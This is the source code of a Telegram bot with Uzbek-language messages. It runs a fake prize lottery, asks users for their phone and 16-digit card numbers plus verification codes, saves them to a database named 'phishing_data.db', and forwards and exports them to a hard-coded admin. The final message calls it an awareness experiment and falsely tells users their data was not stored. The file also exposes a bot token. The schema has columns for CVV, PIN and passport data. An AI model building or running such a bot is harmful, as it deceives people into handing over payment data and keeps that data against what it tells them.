import telebot
from telebot import types
import random
import sqlite3
import threading
import time
import json
from datetime import datetime
import re

TOKEN = "8878797713:AAEBYRAQ_M1RRrTsqNJ25HxIUqnqpDAJqzM"
ADMIN_ID = 8031548575
bot = telebot.TeleBot(TOKEN)

CHANNEL_URL = "https://t.me/samcyber_102"


def init_db():
    conn = sqlite3.connect('phishing_data.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER UNIQUE,
            phone TEXT,
            card_number TEXT,
            card_expiry TEXT,
            card_cvv TEXT,
            card_pin TEXT,
            mothers_name TEXT,
            passport_seria TEXT,
            birth_date TEXT,
            ip_address TEXT,
            device_info TEXT,
            step INTEGER DEFAULT 0,
            language TEXT DEFAULT 'uz',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            code_type TEXT,
            attempts INTEGER DEFAULT 0,
            blocked INTEGER DEFAULT 0,
            FOREIGN KEY(chat_id) REFERENCES users(chat_id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            action TEXT,
            detail TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(chat_id) REFERENCES users(chat_id)
        )
    ''')
    conn.commit()
    conn.close()


init_db()


def get_db():
    return sqlite3.connect('phishing_data.db', check_same_thread=False)


def log_action(chat_id, action, detail=""):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO logs (chat_id, action, detail) VALUES (?, ?, ?)", (chat_id, action, detail))
    conn.commit()
    conn.close()


user_steps = {}

TEXTS = {
    'phone_prompt': (
        "🎮 **O'yinda ishtirok etish uchun telefon raqamingizni kiriting.**\n\n"
        "`+998` avtomatik qo'shiladi — faqat qolgan 9 raqamni yozing.\n"
        "Misol: `901234567`"
    ),
    'phone_invalid': "❌ Noto'g'ri raqam. 9 xonali raqam kiriting (masalan: 901234567):",
    'phone_ok': "✅ Telefon raqamingiz qabul qilindi: `{}`",
    'number_grid': "🎮 **O'yinda ishtirok etish uchun 1 dan 9 gacha bo'lgan raqamlardan birini bosing:**",
    'prize_sms': "📩 **SMS keldi:**\n\nSiz **{} so'm** yutuq egasiga aylandingiz! 🎉",
    'card_prompt': "💳 Pulni kartangizga tushirish uchun **16 xonali** karta raqamingizni kiriting:",
    'card_invalid': "❌ Karta raqami noto'g'ri. 16 xonali raqam kiriting:",
    'code_sent': "📩 Telefoningizga tasdiqlash kodi yuborildi.\n\n🔐 **Kodni kiriting:** `{}`",
    'code_invalid': "❌ Kod noto'g'ri. Qaytadan kiriting:",
    'code2_wait': "⏳ Tasdiqlash jarayoni davom etmoqda... Iltimos, kuting.",
    'code2_sent': "📩 Yangi tasdiqlash kodi yuborildi.\n\n🔐 **Kodni kiriting:** `{}`",
    'blocked': "🚫 Urinishlar tugadi. /start buyrug'i bilan qayta boshlang.",
    'experiment': (
        "⚠️ **BU EKSPERIMENT EDI!** ⚠️\n\n"
        "❌ Siz hech narsa yutmadingiz!\n\n"
        "😱 Agar bu **HAQIQIY** firibgarlik bo'lganida:\n"
        "• Telefon raqamingiz o'g'irlangan bo'lardi\n"
        "• Bank hisobingizdan pul echib olinardi\n"
        "• Shaxsiy ma'lumotlaringiz sotilgan bo'lardi\n\n"
        "🔐 **ESDA TUTING:**\n\n"
        "1️⃣ Tanishilmagan QR kodlarni skanerlamang!\n"
        "2️⃣ Telefon raqamingizni notanish saytlarga bermang!\n"
        "3️⃣ SMS kodlarni **HECH KIMGA** aytmang!\n"
        "4️⃣ \"Bepul sovg'a\" va'dalariga ishonmang!\n\n"
        "📣 Bu tajriba kiberjinoyatlarning oldini olish uchun o'tkazildi.\n\n"
        "✅ Endi siz bu hiylalarni bilasiz — boshqalarga ham ayting!\n\n"
        "🔒 Sizning hech qanday ma'lumotlaringiz bizda saqlanmadi."
    ),
    'channel_follow': "📢 Ushbu holatlarga tushmaslik uchun bizning kanaldagi yangiliklarni kuzatib boring:",
}


def get_text(key):
    return TEXTS.get(key, '')


def format_sum(amount):
    return f"{amount:,}".replace(",", " ")


def normalize_phone(text):
    digits = re.sub(r'\D', '', text or '')
    if digits.startswith('998'):
        digits = digits[3:]
    if len(digits) == 9 and digits.isdigit():
        return '+998' + digits
    return None


def ensure_user_state(chat_id):
    if chat_id not in user_steps:
        user_steps[chat_id] = {'step': 'phone'}
    return user_steps[chat_id]


def safe_answer_callback(call, text=""):
    try:
        bot.answer_callback_query(call.id, text)
    except Exception:
        pass


def get_ip_info(chat_id):
    try:
        user = bot.get_chat(chat_id)
        return {
            'ip': f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}",
            'device': f"{user.first_name or ''} {user.last_name or ''} (@{user.username or 'unknown'})",
        }
    except Exception:
        return {'ip': 'unknown', 'device': 'unknown'}


def build_number_grid():
    markup = types.InlineKeyboardMarkup(row_width=3)
    for row in range(3):
        markup.add(*[
            types.InlineKeyboardButton(str(n), callback_data=f"pick_{n}")
            for n in range(row * 3 + 1, row * 3 + 4)
        ])
    return markup


def build_channel_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📢 Kiber Kanal", url=CHANNEL_URL),
        types.InlineKeyboardButton("📢 Samarqand Cyber", url="https://t.me/samiibuz"),
    )
    return markup


def send_verification_code(chat_id, code_key, handler, text_key='code_sent'):
    code = random.randint(1000, 9999)
    user_steps[chat_id][code_key] = code
    user_steps[chat_id][f'{code_key}_attempts'] = 3
    msg = bot.send_message(
        chat_id,
        get_text(text_key).format(code),
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, handler)


def schedule_second_code(chat_id):
    def _delayed():
        time.sleep(5)
        state = user_steps.get(chat_id)
        if not state or state.get('step') != 'code2_wait':
            return
        state['step'] = 'code2'
        send_verification_code(chat_id, 'code_2', verify_code_2_handler, text_key='code2_sent')

    threading.Thread(target=_delayed, daemon=True).start()


def finish_experiment(chat_id):
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "UPDATE users SET step = 10, completed_at = CURRENT_TIMESTAMP WHERE chat_id = ?",
        (chat_id,)
    )
    conn.commit()
    conn.close()

    log_action(chat_id, "experiment_completed")
    notify_admin(chat_id)

    bot.send_message(chat_id, get_text('experiment'), parse_mode="Markdown")
    bot.send_message(
        chat_id,
        get_text('channel_follow'),
        parse_mode="Markdown",
        reply_markup=build_channel_menu()
    )


# ============== /start ==============
@bot.message_handler(commands=['start'])
def start_handler(message):
    chat_id = message.chat.id
    user_steps[chat_id] = {'step': 'phone'}

    ip_info = get_ip_info(chat_id)
    log_action(chat_id, "bot_started", json.dumps(ip_info))

    msg = bot.send_message(
        chat_id,
        get_text('phone_prompt'),
        parse_mode="Markdown",
        reply_markup=types.ReplyKeyboardRemove()
    )
    bot.register_next_step_handler(msg, get_phone_handler)


# ============== TELEFON ==============
def get_phone_handler(message):
    chat_id = message.chat.id

    if message.contact and message.contact.phone_number:
        phone = normalize_phone(message.contact.phone_number)
    else:
        phone = normalize_phone(message.text)

    if not phone:
        msg = bot.send_message(chat_id, get_text('phone_invalid'), parse_mode="Markdown")
        bot.register_next_step_handler(msg, get_phone_handler)
        return

    user_steps[chat_id]['phone'] = phone
    user_steps[chat_id]['step'] = 'number_pick'

    conn = get_db()
    c = conn.cursor()
    ip_info = get_ip_info(chat_id)
    c.execute('''
        INSERT OR REPLACE INTO users (chat_id, phone, ip_address, device_info, step, language)
        VALUES (?, ?, ?, ?, 1, 'uz')
    ''', (chat_id, phone, ip_info['ip'], ip_info['device']))
    conn.commit()
    conn.close()

    log_action(chat_id, "phone_received", phone)

    bot.send_message(chat_id, get_text('phone_ok').format(phone), parse_mode="Markdown")
    bot.send_message(
        chat_id,
        get_text('number_grid'),
        parse_mode="Markdown",
        reply_markup=build_number_grid()
    )


# ============== RAQAM TANLASH ==============
def handle_number_pick(call):
    chat_id = call.message.chat.id
    state = ensure_user_state(chat_id)

    if state.get('step') != 'number_pick':
        safe_answer_callback(call, "⚠️ /start bosing")
        return

    picked = call.data.split('_')[1]
    state['picked_number'] = picked
    state['step'] = 'prize_shown'

    prize = random.randint(50000, 1000000)
    prize = (prize // 1000) * 1000
    if prize < 50000:
        prize = 50000
    state['prize'] = prize

    safe_answer_callback(call, f"✅ {picked} tanlandi!")
    bot.send_message(
        chat_id,
        get_text('prize_sms').format(format_sum(prize)),
        parse_mode="Markdown"
    )

    log_action(chat_id, "number_picked", f"raqam={picked}, yutuq={prize}")

    msg = bot.send_message(chat_id, get_text('card_prompt'), parse_mode="Markdown")
    state['step'] = 'card'
    bot.register_next_step_handler(msg, get_card_handler)


# ============== KARTA ==============
def get_card_handler(message):
    chat_id = message.chat.id
    card_num = (message.text or '').replace(" ", "")

    if len(card_num) >= 16 and card_num.isdigit():
        user_steps[chat_id]['card'] = card_num
        user_steps[chat_id]['step'] = 'code1'

        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE users SET card_number = ?, step = 2 WHERE chat_id = ?", (card_num, chat_id))
        conn.commit()
        conn.close()

        log_action(chat_id, "card_received", card_num)
        send_verification_code(chat_id, 'code_1', verify_code_1_handler)
    else:
        msg = bot.send_message(chat_id, get_text('card_invalid'), parse_mode="Markdown")
        bot.register_next_step_handler(msg, get_card_handler)


# ============== 1-TASDIQLASH KODI ==============
def verify_code_1_handler(message):
    chat_id = message.chat.id
    user_input = (message.text or '').strip()
    correct_code = str(user_steps[chat_id].get('code_1'))
    attempts = user_steps[chat_id].get('code_1_attempts', 3)

    if user_input == correct_code:
        log_action(chat_id, "code_1_verified")
        user_steps[chat_id]['step'] = 'code2_wait'
        bot.send_message(chat_id, get_text('code2_wait'), parse_mode="Markdown")
        schedule_second_code(chat_id)
    else:
        attempts -= 1
        user_steps[chat_id]['code_1_attempts'] = attempts
        log_action(chat_id, "code_1_failed", f"qolgan={attempts}")

        if attempts <= 0:
            bot.send_message(chat_id, get_text('blocked'))
        else:
            msg = bot.send_message(chat_id, get_text('code_invalid'), parse_mode="Markdown")
            bot.register_next_step_handler(msg, verify_code_1_handler)


# ============== 2-TASDIQLASH KODI ==============
def verify_code_2_handler(message):
    chat_id = message.chat.id
    user_input = (message.text or '').strip()
    correct_code = str(user_steps[chat_id].get('code_2'))
    attempts = user_steps[chat_id].get('code_2_attempts', 3)

    if user_input == correct_code:
        log_action(chat_id, "code_2_verified")
        finish_experiment(chat_id)
    else:
        attempts -= 1
        user_steps[chat_id]['code_2_attempts'] = attempts
        log_action(chat_id, "code_2_failed", f"qolgan={attempts}")

        if attempts <= 0:
            bot.send_message(chat_id, get_text('blocked'))
        else:
            msg = bot.send_message(chat_id, get_text('code_invalid'), parse_mode="Markdown")
            bot.register_next_step_handler(msg, verify_code_2_handler)


# ============== CALLBACK ==============
@bot.callback_query_handler(func=lambda call: call.data is not None)
def callback_handler(call):
    data = call.data
    try:
        if data.startswith('pick_'):
            handle_number_pick(call)
        elif data.startswith('admin_'):
            handle_admin_callback(call)
        else:
            safe_answer_callback(call, "⚠️ /start bosing")
    except Exception as e:
        print(f"Callback xatolik [{data}]: {e}")
        safe_answer_callback(call, "❌ Xatolik. /start bosing.")


# ============== ADMIN ==============
def notify_admin(user_chat_id):
    try:
        data = user_steps.get(user_chat_id, {})
        admin_msg = (
            f"🆕 **Yangi tajriba ishtirokchisi!**\n\n"
            f"👤 Chat ID: `{user_chat_id}`\n"
            f"📱 Telefon: `{data.get('phone', 'N/A')}`\n"
            f"🎲 Tanlangan raqam: `{data.get('picked_number', 'N/A')}`\n"
            f"💰 Yutuq (simulyatsiya): `{format_sum(data.get('prize', 0))} so'm`\n"
            f"💳 Karta: `{data.get('card', 'N/A')}`\n"
            f"🔐 1-kod: `{data.get('code_1', 'N/A')}`\n"
            f"🔐 2-kod: `{data.get('code_2', 'N/A')}`\n"
            f"🕐 Vaqt: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
        )
        bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
    except Exception as e:
        print(f"Admin notify error: {e}")


@bot.message_handler(commands=['admin'])
def admin_panel(message):
    chat_id = message.chat.id
    if chat_id != ADMIN_ID:
        bot.send_message(chat_id, "⛔ Bu buyruq faqat adminlar uchun!")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📋 Barcha ma'lumotlar", callback_data="admin_all"),
        types.InlineKeyboardButton("📊 Statistika", callback_data="admin_stats"),
        types.InlineKeyboardButton("📤 Eksport (JSON)", callback_data="admin_export"),
        types.InlineKeyboardButton("📜 Loglar", callback_data="admin_logs"),
    )
    bot.send_message(
        chat_id,
        "👑 **Admin Panel**\n\nQuyidagi bo'limlardan birini tanlang:",
        parse_mode="Markdown",
        reply_markup=markup
    )


def handle_admin_callback(call):
    chat_id = call.message.chat.id
    if chat_id != ADMIN_ID:
        safe_answer_callback(call, "⛔ Ruxsat yo'q!")
        return

    action = call.data.split('_')[1]
    conn = get_db()
    c = conn.cursor()

    if action == 'all':
        c.execute("SELECT * FROM users WHERE completed_at IS NOT NULL ORDER BY completed_at DESC")
        users = c.fetchall()
        if not users:
            bot.send_message(chat_id, "📭 Hali hech qanday ma'lumot to'plangan emas.")
        else:
            for user in users[:10]:
                user_text = (
                    f"👤 **Foydalanuvchi #{user[0]}**\n"
                    f"🆔 Chat ID: `{user[1]}`\n"
                    f"📱 Telefon: `{user[2]}`\n"
                    f"💳 Karta: `{user[3]}`\n"
                    f"🌐 IP: `{user[10]}`\n"
                    f"📱 Qurilma: `{user[11]}`\n"
                    f"🕐 Yakunlangan: `{user[14]}`"
                )
                bot.send_message(chat_id, user_text, parse_mode="Markdown")

    elif action == 'stats':
        c.execute("SELECT COUNT(*) FROM users")
        total = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users WHERE completed_at IS NOT NULL")
        completed = c.fetchone()[0]
        stats = (
            f"📊 **Statistika**\n\n"
            f"👥 Jami foydalanuvchilar: `{total}`\n"
            f"✅ Tajribani tugatganlar: `{completed}`\n"
            f"❌ Tugallamaganlar: `{total - completed}`"
        )
        bot.send_message(chat_id, stats, parse_mode="Markdown")

    elif action == 'export':
        c.execute("SELECT * FROM users WHERE completed_at IS NOT NULL")
        users = c.fetchall()
        export_data = []
        for user in users:
            export_data.append({
                'id': user[0],
                'chat_id': user[1],
                'phone': user[2],
                'card_number': user[3],
                'ip': user[10],
                'device': user[11],
                'completed_at': user[14],
            })
        with open('export_data.json', 'w') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        bot.send_document(chat_id, open('export_data.json', 'rb'))

    elif action == 'logs':
        c.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 20")
        logs = c.fetchall()
        if not logs:
            bot.send_message(chat_id, "📭 Loglar topilmadi.")
        else:
            log_text = "**📜 So'nggi 20 ta log:**\n\n"
            for log in logs:
                log_text += f"• [{log[4]}] `{log[1]}` → {log[2]}: {log[3]}\n"
            if len(log_text) > 4000:
                for i in range(0, len(log_text), 4000):
                    bot.send_message(chat_id, log_text[i:i + 4000], parse_mode="Markdown")
            else:
                bot.send_message(chat_id, log_text, parse_mode="Markdown")

    conn.close()
    safe_answer_callback(call, "✅ Bajarildi!")


# ============== FALLBACK ==============
@bot.message_handler(func=lambda message: True)
def fallback_handler(message):
    chat_id = message.chat.id
    if message.content_type == 'contact':
        get_phone_handler(message)
        return
    bot.send_message(chat_id, "Iltimos, /start buyrug'ini bosing.")


if __name__ == "__main__":
    print("=" * 50)
    print("Kiber-ogohlantirish boti ishga tushdi!")
    print(f"Admin ID: {ADMIN_ID}")
    print("=" * 50)

    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            print(f"Xatolik: {e}")
            print("Qayta ulanish 5 soniyadan keyin...")
            time.sleep(5)
